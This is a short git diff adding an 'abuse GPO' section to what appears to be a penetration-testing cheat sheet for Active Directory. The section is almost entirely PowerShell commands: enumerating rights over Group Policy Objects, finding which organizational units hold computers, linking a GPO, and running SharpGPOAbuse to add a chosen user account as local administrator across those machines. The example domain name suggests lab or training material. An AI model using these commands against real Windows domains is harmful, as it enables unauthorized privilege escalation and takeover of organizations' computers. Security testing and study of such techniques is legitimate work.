@@ -1435,6 +1435,26 @@ serviceprincipalname=...
 Enter-PSSession -ComputerName target_PC
 ```
 
+#### abuse GPO
+https://github.com/juliourena/plaintext/blob/master/Powershell/Get-GPOEnumeration.ps1
+```powershell
+# Modify GPO priv
+Get-GPOEnumeration
+# Link GPOs priv
+Get-GPOEnumeration -LinkGPOs
+# Create GPO priv
+Get-GPOEnumeration -CreateGPO
+
+# where OU are PC
+Get-DomainOU | foreach { $ou = $_.distinguishedname; Get-DomainComputer -SearchBase $ou -Properties dnshostname | select @{Name='OU';Expression={$ou}}, @{Name='FQDN';Expression={$_.dnshostname}} }
+
+# Create GPO link
+New-GPLink -Name TestGPO -Target "OU=TestOU,DC=inlanefreight,DC=local"
+# Abuse GPO add local admin 
+## --force
+.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount own_user --GPOName "TestGPO" 
+```
+
 ### LOLBIN
 ```powershell
 Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
